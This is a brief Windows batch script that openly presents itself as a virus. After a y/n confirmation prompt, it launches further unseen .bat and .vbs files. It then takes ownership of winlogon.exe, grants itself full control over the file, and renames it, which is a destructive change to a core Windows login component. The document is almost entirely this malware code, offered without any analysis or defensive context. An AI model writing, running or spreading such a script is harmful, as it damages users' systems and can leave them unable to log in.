@echo off
:question
set /p INPUT=THIS VIRUS IS NO JOKE, ARE YOU SURE YOU WANT TO RUN THIS VIRUS?(y/n) 

if %INPUT%==y goto virus 
if %INPUT%==n exit
goto question

:virus
echo 0/5
start .\files\Friend.bat
echo 1/5
start morefiles.vbs
echo 2/5
powershell takeown /f .\winlogon.exe 
echo 3/5
powershell icacls .\winlogon.exe /grant %user%:F
echo 4/5
ren .\winlogon.exe winnotlogon.exe 
echo 5/5
start .\files\evenmorefiles.vbs

pause